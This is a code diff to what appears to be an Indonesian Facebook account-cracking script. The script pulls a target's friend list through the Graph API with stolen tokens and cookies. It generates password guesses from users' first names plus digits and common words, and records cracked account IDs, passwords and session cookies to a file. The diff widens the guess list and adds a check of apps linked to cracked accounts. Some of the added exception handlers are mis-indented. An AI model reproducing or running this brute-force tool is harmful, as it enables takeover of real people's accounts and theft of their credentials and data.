@@ -182,7 +182,7 @@ def banner():
  |  _||  _  | |    |  __|| ___ \| | | || | | |    \     |  |   Update By GreynoooXD 
  | |  | | | | \__/\| |___| |_/ /\ \_/ /\ \_/ / |\  \    |  |   GreynoooXD Update
  \_|  \_| |_/\____/\____/\____/  \___/  \___/\_| \_/                                                                                                     
-             """,width=90,title=f"Banner",style=f"bold white"))
+             """,width=90,title=f"Banner",style=f"bold blue"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -1110,14 +1110,18 @@ def nge_krek():
 			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
 			for c in b["friends"]["data"]:
 				id.append(c["id"]+"|"+c["name"])
-			print('>> Total Idz : {}'.format(len(id)));setting()
-		except Exception as e:
-			print(e)
+			print(' 🔥 : {}'.format(len(id)));setting()
+		except requests.exceptions.ConnectionError:
+		print(' [bold red]Internet Lu Gak Ada Anjing')
+		exit()
+	except (KeyError,IOError):
+		print(' [bold blue]Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
+		exit()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
-		a = input('masukan id target: ')
+		a = input('╰─  masukan id target: ')
 		try:
 			params = {
 			"access_token": token, 
@@ -1126,9 +1130,13 @@ def dump_massal():
 			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
 			for c in b["friends"]["data"]:
 				id.append(c["id"]+"|"+c["name"])
-			print('>> Total Idz : {}'.format(len(id)));setting()
-		except Exception as e:
-			print(e)
+			print(' 🔥 : {}'.format(len(id)));setting()
+		except requests.exceptions.ConnectionError:
+		print(' [bold red]Internet Lu Gak Ada Anjing')
+		exit()
+	except (KeyError,IOError):
+		print(' [bold blue]Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
+		exit()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	print('')
@@ -1183,8 +1191,18 @@ def setting():
 	else:
 		pwpluss.append('no')
 		
+	cetak(panel(f'[bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold white"))
+	_brayen_ = input('╰─  Pilih : ')
+	if _brayen_ in ['']:
+		print('╰─  Pilih Yang Bener Kontol ')
+		exit()
+	elif _brayen_ in ['y','Y']:
+		taplikasi.append('ya')
+	else:
+		taplikasi.append('no')
+		
 	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
-	uatambah = input(f' ╰─  Pilih : ')
+	uatambah = input(f'╰─  Pilih : ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
 		bzer = input(f' ╰─  Masukan User-Agent : ')
@@ -1214,18 +1232,67 @@ def passwrd():
 						pass
 					else:
 						pwv.append(nmf)
+						pwv.append(frs+'00')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
+						pwv.append(frs+'09')
+						pwv.append(frs+'0')
+						pwv.append(frs+'1')
+						pwv.append(frs+'2')
+						pwv.append(frs+'3')
+						pwv.append(frs+'4')
+						pwv.append(frs+'5')
+						pwv.append(frs+'6')
+						pwv.append(frs+'7')
+						pwv.append(frs+'8')
+						pwv.append(frs+'9')
+						pwv.append(frs+'12')
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append('katasandi')
+						pwv.append('kontol')
+						pwv.append('kamunanya')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'321')
+						pwv.append(frs+'00')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
+						pwv.append(frs+'09')
+						pwv.append(frs+'0')
+						pwv.append(frs+'1')
+						pwv.append(frs+'2')
+						pwv.append(frs+'3')
+						pwv.append(frs+'4')
+						pwv.append(frs+'5')
+						pwv.append(frs+'6')
+						pwv.append(frs+'7')
+						pwv.append(frs+'8')
+						pwv.append(frs+'9')
+						pwv.append(frs+'12')
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
+						pwv.append('katasandi')
+						pwv.append('kontol')
+						pwv.append('kamunanya')
 				if 'ya' in pwpluss: 
 					for xpwd in pwnya:
 						pwv.append(xpwd)
@@ -1375,7 +1442,7 @@ def crackmbasic(idf,pwv):
 				tree = Tree(f"  ")
 				tree.add(f"[ OK ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}").add(f"[bold green]{ua}\n")
 				cetak(tree) 
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'|'+kuki+'\n')
 				cek_apk(session,coki)
 				break
 				
